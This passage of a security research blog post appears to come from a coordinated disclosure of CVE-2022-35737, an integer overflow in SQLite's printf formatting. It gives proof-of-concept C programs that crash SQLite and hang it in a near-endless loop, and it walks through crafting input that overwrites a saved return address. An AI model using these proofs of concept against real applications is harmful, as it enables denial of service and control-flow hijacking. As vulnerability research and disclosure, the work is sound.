 static zend_string* sqlite_handle_quoter(pdo_dbh_t *dbh, const zend_string *unquoted, enum pdo_param_type paramtype)
 {
		char *quoted = safe_emalloc(2, ZSTR_LEN(unquoted), 3);
		/* TODO use %Q format? */
		sqlite3_snprintf(2*ZSTR_LEN(unquoted) + 3, quoted, "'%q'", ZSTR_VAL(unquoted));
		zend_string *quoted_str = zend_string_init(quoted, strlen(quoted), 0);
		efree(quoted);
		return quoted_str;
 }

```

On line 231, an unsigned long `(2*ZSTR_LEN(unquoted) + 3)` is passed as the first parameter to `sqlite3_snprintf`, which expects a signed integer. This felt exciting, and we quickly scripted a simple proof of concept. We expected to be able to exploit this bug to produce a poorly formatted string with mismatched quote characters by passing large strings to the function, and possibly achieve SQL injection in vulnerable applications.

Imagine our surprise when our [proof of concept](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/pdo-sqlite3-quote-poc.php) crashed the PHP interpreter:

### There’s a bug in my bug!

We quickly determined that the crash was occurring in the SQLite shared object, so we naturally took a closer look at the `sqlite3_snprintf` function.

SQLite implements [custom versions of the `printf` family](https://www.sqlite.org/c3ref/mprintf.html) of functions and adds the new format specifiers `%Q`, `%q`, and `%w`, which are designed to properly escape quote characters in the input string in order to make safe SQL queries. [For example](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-good-example.c), we wrote the following code snippet to properly use `sqlite3_snprintf` with the format specifier `%q` to output a string where all single-quote characters are escaped with another single quote. Additionally, the entire string is wrapped in a leading and trailing single quote, the way the PHP quote function intends:

```

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

int main(int argc, char *argv[]) {

    char src[] = "hello, \'world\'!";
    char dst[sizeof(src) + 4];  // Add 4 to account for extra quotes.

    sqlite3_snprintf(sizeof(dst), dst, "'%q'", src);

    printf("src: %s\n", src);
    printf("dst: %s\n", dst);
    return 0;
}

```

`sqlite3_snprintf` properly wraps the original string in single quotes, and escapes any existing single-quotes in the input string.

Next, we [changed our program](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-crash.c) to imitate the behavior of the PHP script by passing the same large 2GB string directly to `sqlite3_snprintf`:

```

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

#define STR_LEN ((0x100000001 - 3) / 2)

int main(int argc, char *argv[]) {

    char *src = calloc(1, STR_LEN + 1); // Account for NULL byte.
    memset(src, 'a', STR_SIZE);
    char *dst = calloc(1, STR_LEN + 3); // Account for extra quotes and NULL byte.

    sqlite3_snprintf(2*STR_LEN + 3, dst, "'%q'", src);

    printf("src: %s\n", src);
    printf("dst: %s\n", dst);
    return 0;
}

```

A crash! We seem to have found a culprit: large inputs to `sqlite3_snprintf`. Thus began a journey down a rabbit hole where we discovered that SQLite does not properly handle large strings in parts of its custom implementations of the `printf` family of functions. Even further down the rabbit hole, we discovered that a compiler optimization made it easier to exploit the SQLite vulnerability.

## The Vulnerability

The custom SQLite `printf` family of functions internally calls the function `sqlite3_str_vappendf`, which handles string formatting. Large string inputs to the `sqlite3_str_vappendf` function can cause signed integer overflow when the format substitution type is `%q`, `%Q`, or `%w`.

`sqlite3_str_vappendf` scans the input `fmt` string and formats the variable-sized argument list according to the format substitution types specified in the `fmt` string. In the case statement for handling the `%q`, `%Q`, and `%w` format specifiers ([src/printf.c:L803-850](https://sqlite.org/src/info?name=6166a30417b05c5b2f82e1f183f75faa2926ad60531c0b688a57dbc951441a20&ln=803-850)), the function scans the input string for quote characters in order to calculate the correct number of output bytes (lines 824-828) and then copies the input to the output buffer and adds quotation characters as required (lines 842-845). In the snippet below, `escarg` points to the input string:

```

case etSQLESCAPE:           /* %q: Escape ' characters */
case etSQLESCAPE2:          /* %Q: Escape ' and enclose in '...' */
case etSQLESCAPE3: {        /* %w: Escape " characters */
  int i, j, k, n, isnull;
  int needQuote;
  char ch;
  char q = ((xtype==etSQLESCAPE3)?'"':'\'');   /* Quote character */
  char *escarg;

  if( bArgList ){
    escarg = getTextArg(pArgList);
  }else{
    escarg = va_arg(ap,char*);
  }
  isnull = escarg==0;
  if( isnull ) escarg = (xtype==etSQLESCAPE2 ? "NULL" : "(NULL)");
  /* For %q, %Q, and %w, the precision is the number of bytes (or
  ** characters if the ! flags is present) to use from the input.
  ** Because of the extra quoting characters inserted, the number
  ** of output characters may be larger than the precision.
  */
  k = precision;
  for(i=n=0; k!=0 && (ch=escarg[i])!=0; i++, k--){
    if( ch==q )  n++;
    if( flag_altform2 && (ch&0xc0)==0xc0 ){
      while( (escarg[i+1]&0xc0)==0x80 ){ i++; }
    }
  }
  needQuote = !isnull && xtype==etSQLESCAPE2;
  n += i + 3;
  if( n>etBUFSIZE ){
    bufpt = zExtra = printfTempBuf(pAccum, n);
    if( bufpt==0 ) return;
  }else{
    bufpt = buf;
  }
  j = 0;
  if( needQuote ) bufpt[j++] = q;
  k = i;
  for(i=0; i<k; i++){
    bufpt[j++] = ch = escarg[i];
    if( ch==q ) bufpt[j++] = ch;
  }
  if( needQuote ) bufpt[j++] = q;
  bufpt[j] = 0;
  length = j;
  goto adjust_width_for_utf8;
}

```

The number of quote characters (`int n`) and the total number of bytes in the input string (`int i`) are used to calculate the maximum total bytes required in the output buffer (L832: `n+=i+3`). This calculation can cause n to overflow to a negative value, for example, when the int type is 32-bits and `n=0` and `i=0x7ffffffe`. This is possible when the input string contains `0x7ffffffe` ASCII characters with no quote characters.

Lines 833-838 are supposed to ensure that a buffer of sufficient size is allocated to receive the formatted bytes of the input string. If the output string size could exceed `etBUFSIZE` bytes (70 bytes, by default), the program dynamically allocates a buffer of sufficient size to hold the output string (line 834). Otherwise, the program expects the output buffer to be smaller than the stack-allocated buffer of etBUFSIZE bytes, and the small stack-allocated buffer is used instead (line 837). At least `i` bytes are copied from the input into the destination buffer. When n overflows to a negative value, the stack-allocated buffer is used, even though `i` can exceed `etBUFSIZE`, resulting in a stack buffer overflow when the input string is copied to the output buffer (line 843).

## The Exploits

But can we do more interesting things with this vulnerability than just crash the target program? Of course!

The input string must be very large to reach the bug condition where n overflows to a negative value at line 832. The challenge is that when the input string is very large, the variable `i` (which counts the number of bytes in the input string) is also very large, resulting in a lot of data written to the stack and causing the program to crash at line 843. We set out to determine whether it is possible to cause n to overflow on line 832, but to also cause `i` to stay small and positive at line 843 and thus avoid crashing. We revisit the loop where `i` is computed, from lines 824 to 830:

```

/* For %q, %Q, and %w, the precision is the number of bytes (or
** characters if the ! flags is present) to use from the input.
** Because of the extra quoting characters inserted, the number
** of output characters may be larger than the precision.
*/
k = precision;
for(i=n=0; k!=0 && (ch=escarg[i])!=0; i++, k--){
  if( ch==q )  n++;
  if( flag_altform2 && (ch&0xc0)==0xc0 ){
    while( (escarg[i+1]&0xc0)==0x80 ){ i++; }
  }
}

```

The purpose of this loop is to scan the input string (`escarg`) for quote characters (`q`), incrementing `n` each time one is found. If our goal is to cause a controlled stack buffer overflow that does not crash the program, then the loop must terminate with values such that `n+=i+3` results in a value less than `etBUFSIZE` (a macro defined to 70) and `i` must be a relatively small positive integer that is greater than `etBUFSIZE`.

The `k` and `flag_altform2` variables in the loop are related to two features of the SQLite `printf` functions: [optional precision](https://www.sqlite.org/printf.html#:~:text=The%20Optional%20Precision%20Field) and the [optional alternate format flag 2](https://www.sqlite.org/printf.html#:~:text=The%20Options%20Flags%20Field), which are both influenced by the format string. In the example below, including `!` in the format string sets `flag_altform2=true`, and the `.80 sets precision=80`:

```
   snprintf3_snprintf(len, buf, “‘%!.80q’”, src)
```

When precision is not set in the format string, it is set by default to -1. Therefore, by default `int k=-1`, and the loop decrements `k` with each iteration, so the outer loop can execute 232 times before `k=0`.

So far in our analysis of CVE-2022-35737, we’ve made few assumptions about the format string passed to the vulnerable function, other than that it contains one of the vulnerable format specifiers (`%Q`, `%q`, or `%w`). To progress further in our exploitation, we need to make one more assumption: that the `flag_altform2` is set by providing a `!` character in the format string.

When `flag_altform2=true`, it is possible to increment `i` in the inner loop without decrementing `k` by including unicode characters in the input string. With this in mind, perhaps we can include enough quote characters in the input to set n to a large positive integer, and then cause `i` to increment in the inner loop until it wraps back around to a small positive integer, and then somehow exit the loop. But how will `i` behave when it overflows beyond the maximum signed integer value? Will it wrap back to `0`, or to a negative value? Is it possible to tell by just looking at the source code? No, it isn’t; this is undefined behavior, so we must inspect the compiled binary to see what choices the compiler made to represent `i`.

### Divergent Representations in the compiled binary

We have been working on an Ubuntu 20.04 host and have a version of `libsqlite.so` version 3.31.1 installed from the APT package manager, so that is the version of the compiled binary that we examine in Binary Ninja:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822-1024x1001.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png)

Binary Ninja disassembly of the compiled loop from source code lines 824 to 830, where the `escarg` input string is scanned for quote-characters. [1a] and [1b] indicate source line 825 `escarg[i]; … i++`. [2a] and [2b] indicate source line 828 `escarg[i+1]; … i++.`

At instruction [1a], `r10` contains the address of `escarg`, and `rsi` is used to index into the buffer to fetch a value from it, where the `rsi` register was set by sign-extending the 32-bit `edx` register in the instruction immediately before it. This corresponds to the `escarg[i]` expression on line 825 of the source code. With each loop iteration, `edx` is incremented at instruction [1b]. This means that the source code variable i is represented using signed 32-bit integer semantics, and so when `i` reaches the maximum 32-bit positive signed integer value (`0x7fffffff`), it will increment to `0x80000000` at [1b], which will be sign-extended into `rsi` as `0xffffffff80000000` and used to negatively index into `escarg`.

However, instruction [2a] tells a different story. Here, `r10` still contains the address of `escarg`, but rax+1 is used to index into the buffer, corresponding to the `escarg[i+1]` expression on line 828 of the source code, in the inner loop that scans for unicode characters. Instruction [2b] increments `rax`, but as a 64-bit value—and with no 32-bit sign-extension—before looping back to [2a]. Here, `i` is represented with unsigned 64-bit integer semantics, so that when i exceeds the maximum signed 32-bit integer value (`0x7fffffff`), its next memory access is to `escarg+0x80000000`. **We have divergent representations of the same source variable, and two different values can be read from memory for the same value of the source variable `i`!** This discovery prompted us to search for more instances of these “divergent representations,” and we describe this search in a forthcoming blog post.

Okay, so can we use this compilation quirk to set the conditions for a more interesting exploit of CVE-2022-35737? Turns out, yes.

### Controlling the Saved Return Address

Here’s a quick recap of the conditions that we are trying to set:

```

case etSQLESCAPE:           /* %q: Escape ' characters */
case etSQLESCAPE2:          /* %Q: Escape ' and enclose in '...' */
case etSQLESCAPE3: {        /* %w: Escape " characters */
  int i, j, k, n, isnull;
  int needQuote;
  char ch;
  char q = ((xtype==etSQLESCAPE3)?'"':'\'');   /* Quote character */
  char *escarg;

  if( bArgList ){
    escarg = getTextArg(pArgList);
  }else{
    escarg = va_arg(ap,char*);
  }
  isnull = escarg==0;
  if( isnull ) escarg = (xtype==etSQLESCAPE2 ? "NULL" : "(NULL)");
  /* For %q, %Q, and %w, the precision is the number of bytes (or
  ** characters if the ! flags is present) to use from the input.
  ** Because of the extra quoting characters inserted, the number
  ** of output characters may be larger than the precision.
  */
  k = precision;
  for(i=n=0; k!=0 && (ch=escarg[i])!=0; i++, k--){
    if( ch==q )  n++;
    if( flag_altform2 && (ch&0xc0)==0xc0 ){
      while( (escarg[i+1]&0xc0)==0x80 ){ i++; }
    }
  }
  needQuote = !isnull && xtype==etSQLESCAPE2;
  n += i + 3;
  if( n>etBUFSIZE ){
    bufpt = zExtra = printfTempBuf(pAccum, n);
    if( bufpt==0 ) return;
  }else{
    bufpt = buf;
  }
  j = 0;
  if( needQuote ) bufpt[j++] = q;
  k = i;
  for(i=0; i<k; i++){
    bufpt[j++] = ch = escarg[i];
    if( ch==q ) bufpt[j++] = ch;
  }
  if( needQuote ) bufpt[j++] = q;
  bufpt[j] = 0;
  length = j;
  goto adjust_width_for_utf8;
}

```

Here is a screenshot to highlight what we want to concentrate on:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM-966x1024.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png)

We want the loop at [1] to terminate with values of `i` and `n` set so that the calculation at [2] overflows, resulting in a value of `n` that is negative or less than `etBUFSIZE (70)` and `i` set to a relatively small positive integer value that is greater than `etBUFSIZE`. This would allow the loop at [3] to write beyond the bounds of the stack-allocated `bufpt`, but without causing the program to crash immediately by writing beyond the stack memory region.

Consider the string input that contains `0x7fffff00` single-quote (‘) characters, followed by a single `0xc0` byte (a unicode prefix) and then by enough `0x80` bytes to bring the total string length to `0x100000100` bytes (followed by a `NULL` byte). Let’s call this string `string1`, and think about what happens when this string is passed to `sqlite3_snprintf`:

```
snprintf3_snprintf(len, buf, “‘%!q’”, string1)
```

(Notice that we’ve changed the format string to allow unicode characters by providing the `!` character.)

When the loop at [1] scans the first `0x7fffff00` bytes of `string1`, `n` and `i` both increment to `0x7fffff00`. On the next loop iteration, the program reads the unicode character prefix from the input string and enters the inner loop, where `i` is represented with 64-bit unsigned semantics. The `i` variable increments to `0x100000100` before a `NULL` byte is encountered, causing the inner loop to terminate. At this point in program execution, `n=0x7fffff00` and, when downcast to a 32-bit value, `i=0x100`. If the loop at [1] terminated at this point, the computation `n+=i+3` would result in `n=0x80000003`, which is negative when treated as a signed value. Meanwhile, `i` is now a small positive integer but is greater than `70 (etBUFSIZE)`, which would result in a stack buffer overflow when `256 (0x100)` bytes are read into a stack buffer of 70 bytes. This shows progress towards our goal: An extra couple of hundred bytes written to the stack are unlikely to reach the end of the stack memory region, but they are likely to reach interesting data saved on the stack, like saved return addresses and stack canaries. We can determine the exact position of this data on the stack by inspecting the target binary, and then adjust the input string size to control how much data is overwritten to the stack buffer.

Unfortunately, this approach will not work as-is, because the loop at [1] does not terminate at the point described above. Because of the divergent representations of the `i` variable, `escarg[i+1]` at line 828 (inner loop) will represent `i` as `0x100000100` and read a `NULL` byte at the end of our large string, but `escarg[i]` at line 825 (outer loop) will represent `i` as `0x100` and instead read a single-quote character (`‘`) from near the beginning of the input string. As a result, the loop exit condition is not met and the loop continues, with `i=0x100` and `n=0x7fffff00`. Notably, by this point `k` has decremented `0x7fffff00` times. Because there is no NULL byte in the input string in the first 231 bytes, `escarg[i]` will never read a `NULL` byte at line 825, and we have to instead depend on `k` decrementing to `0` in order to exit the loop at [1]. We can accomplish this by allowing the outer loop to continue incrementing until `k` has decremented all the way to `0`, but with specially calculated values for `n` and `i`.

With this thought in mind, we can take the same approach described above, which is to increment `n` to a very large positive value by supplying single-quote characters in the input string, and to then set `i` to a small positive value by supplying unicode characters to increment `i` using 64-bit unsigned semantics. We calculate our values by accounting for the fact that the outer loop will increment 232 times because `k` needs to decrement from `0xffffffff` to `0`.

Our [proof of concept](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-control-pc.c) uses this insight to control the number of bytes that overflow the stack-allocated buffer and overwrite the saved return address and stack canary:

This proof of concept causes the program to crash, but with a SIGABRT rather than a SIGSEGV. This implies that a stack canary was overwritten and that the vulnerable function tried to return. This is in contrast to the earlier crashing proof of concept that crashed before reaching the function return.

To confirm that we have successfully controlled the saved return address and stack canary, we can use GDB to view the stack frame before the vulnerable function returns:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM-1024x691.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png)

Executing the proof of concept in a debugger shows that the saved return address is set to `0xdeadbeefdeadbeef`.

Note that in a non-contrived scenario, a real stack canary will contain a `NULL byte`, which would defeat the proof of concept above because the `NULL` byte will cause the string-scanning loop to terminate before the entire payload is copied over the return address. Clever exploitation techniques or specific format string conditions may allow an attacker to bypass this, but our intention is to show that the saved return address can be overwritten.

### Looping (Nearly) Forever

We took our exploitation one step further and developed a [proof of concept](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-livelock.c) that uses the divergent representations of the `i` variable to cause loop [1] to iterate nearly infinitely by incrementing `i` 264 times, which effectively takes forever. This is achieved by causing the inner loop to increment `i` 232 times on every iteration of loop [1], which will also increment 232 times. The interesting part of this proof of concept is that it doesn’t actually reach the vulnerable integer overflow computation on line 832, but uses only the undefined behavior that results from allowing string inputs larger than what can be represented with 32-bit integers. All that is required is to fill a buffer of `0x100000000` bytes with unicode prefix characters (a single byte of `0xc0` followed by bytes of `0x80`), and the loop at [1] will never terminate:

```

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    size_t src_buf_size = 0x100000001;

    char *src = calloc(1, src_buf_size);
      if (!src) {
        printf("bad allocation\n");
        return -1;
    }
    src[0] = '\xc0';
    memset(src+1, '\x80',  0xffffffff);

    char dst[256];
    sqlite3_snprintf(256, dst, "'%!q'", src);
    free(src);
    return 0;
}

```

We showed that CVE-2022-35737 is exploitable when large string inputs are passed to the SQLite implementations of the `printf` functions and when the format string contains the `%Q`, `%q`, or `%w` format substitution types. This is enough to cause the program to crash. We also showed that if the format string additionally allows for unicode characters by providing the `!` character, then it is possible to overwrite the saved return address and to cause the program to loop (nearly) infinitely.

## But, SQLite is well-tested, right?

SQLite is extensively tested with 100% branch test coverage. We discovered this vulnerability despite the tests, which raises the question: how did the tests miss it?

SQLite maintains an internal memory limit of 1GB, so the vulnerability is not reachable in the SQLite program. The problem is “defined away” by the notion that SQLite does not support big strings necessary to trigger this vulnerability.

However, the C APIs provided by SQLite do not enforce that their inputs adhere to the memory limit, and applications are able to call the vulnerable functions directly. The notion that large strings are unsupported by SQLite is not communicated with the API, so application developers cannot know how to enforce input size limits on these functions. When this code was first written, most processors had 32-bit registers and 4GB of addressable memory, so allocating 1GB strings as input was impractical. Now that 64-bit processors are quite common, allocating such large strings is feasible and the vulnerable conditions are reachable.

Unfortunately, this vulnerability is an example of one where extensive branch test coverage does not help, because no new code paths are introduced. 100% branch coverage says that every line of code has been executed, but not how many times. This vulnerability is the result of invalid data that causes code to execute billions of times more than it should.

The thoroughness of SQLite’s tests is remarkable — the discovery of this vulnerability should not be taken as a knock on the robustness of the tests. In fact, we wish more projects put as much emphasis on testing as SQLite does. Nonetheless, this bug is evidence that even the best-tested software can have exploitable bugs.

## Conclusion

Not every system or application that uses the SQLite `printf` functions is vulnerable. For those that are, CVE-2022-35737 is a critical vulnerability that can allow attackers to crash or control programs. The bug has been particularly interesting to analyze, for a few reasons. For one, the inputs required to reach the bug condition are very large, which makes it difficult for traditional fuzzers to reach, and so techniques like static and manual analysis were required to find it. For another, it’s a bug that may not have seemed like an error at the time that it was written (dating back to 2000 in the SQLite source code) when systems were primarily 32-bit architectures. And—most interestingly to us at Trail of Bits—its exploitation was made easier by the discovered “divergent representations” of the same source variable, which we explore further in a separate blog post.

I’d like to thank my mentor, Peter Goodman, for his expert guidance throughout my summer internship with Trail of Bits. I’d also like to thank Nick Selby for his help in navigating the responsible disclosure process, and all members of the Trail of Bits team who assisted in advising and writing this blog post.

## Coordinated disclosure
